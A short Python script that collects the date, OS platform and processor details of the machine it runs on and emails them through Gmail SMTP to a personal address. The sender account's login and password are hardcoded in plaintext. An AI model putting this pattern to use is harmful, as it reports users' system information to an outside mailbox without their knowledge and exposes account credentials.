import datetime
import platform
import smtplib

now = datetime.datetime.now()

os = platform.platform()
pr = platform.processor()

nd = now.year, now.month, now.day, now.hour, now.minute
nds = str(nd)

print(nds)
print(os)
print(pr)

s = nds + '\n' + os + '\n' + pr + '\n' + 'u_s' + '\n'

server = smtplib.SMTP('smtp.gmail.com: 587')
server.starttls()
server.login('fmdsmkeii45enredfg45tgededs@gmail.com', '23hdfskjdfui43hj')
server.sendmail('fmdsmkeii45enredfg45tgededs@gmail.com', 'nicholas.romanets@gmail.com', s)